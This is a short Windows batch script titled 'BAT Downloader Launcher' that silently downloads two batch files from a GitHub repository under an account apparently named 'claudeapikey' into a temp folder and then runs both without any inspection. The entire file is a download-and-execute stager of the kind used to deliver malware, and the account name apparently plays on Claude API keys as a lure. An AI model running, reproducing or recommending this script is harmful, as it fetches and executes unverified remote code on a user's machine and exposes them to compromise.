
@echo off
setlocal
title BAT Downloader Launcher

set "DEST=%TEMP%\MyScripts"
if not exist "%DEST%" mkdir "%DEST%"


curl.exe -fLsS "https://raw.githubusercontent.com/claudeapikey/set/refs/heads/main/pritam.bat" -o "%DEST%\first.bat"
if errorlevel 1 goto error


curl.exe -fLsS "https://raw.githubusercontent.com/claudeapikey/set/refs/heads/main/bhaiyya.bat" -o "%DEST%\second.bat"
if errorlevel 1 goto error


call "%DEST%\first.bat"
if errorlevel 1 goto error


call "%DEST%\second.bat"
if errorlevel 1 goto error

exit /b 0

:error

exit /b 1
